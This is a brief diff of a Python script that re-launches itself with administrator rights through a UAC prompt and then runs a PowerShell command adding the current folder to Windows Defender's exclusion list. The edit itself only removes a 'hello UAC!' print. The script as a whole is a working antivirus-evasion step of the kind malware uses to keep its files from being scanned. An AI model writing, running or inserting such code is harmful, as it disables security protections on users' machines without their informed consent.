@@ -3,6 +3,7 @@ import os
 import sys
 import win32com.shell.shell as shell
 
+
 if sys.argv[-1] != 'asadmin':
     script = os.path.abspath(sys.argv[0])
     params = ' '.join([script]+sys.argv[1:]+['asadmin'])
@@ -11,5 +12,4 @@ if sys.argv[-1] != 'asadmin':
 
 script = "powershell -Command Add-MpPreference -ExclusionPath "+os.getcwd()
 subprocess.call(script,shell=True)
-print("hello UAC!")
 os.system("pause")
